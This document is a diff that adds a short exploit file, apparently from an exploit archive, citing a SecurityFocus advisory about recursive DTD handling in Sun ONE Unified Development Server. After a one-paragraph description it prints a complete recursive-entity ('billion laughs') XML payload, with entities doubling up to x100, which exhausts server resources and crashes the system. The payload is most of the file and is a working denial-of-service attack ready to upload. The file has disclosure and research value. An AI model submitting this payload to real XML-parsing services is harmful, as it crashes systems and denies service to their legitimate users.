@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/6626/info
+
+It has been reported that problems with the handling of recursive document type definitions (DTDs) occur in Sun ONE Unified Development Server (UDS). When a document is uploaded containing these types of constructs, the system experiences high resource consumption that can result in crash of the system, and denial of service to legitimate users.
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foobar [
+<!ENTITY x0 "hello">
+<!ENTITY x1 "&x0;&x0;">
+<!ENTITY x2 "&x1;&x1;">
+<!ENTITY x3 "&x2;&x2;">
+<!ENTITY x4 "&x3;&x3;">
+...
+<!ENTITY x98 "&x97;&x97;">
+<!ENTITY x99 "&x98;&x98;">
+<!ENTITY x100 "&x99;&x99;">
+]>
+<foobar>&x100;</foobar>
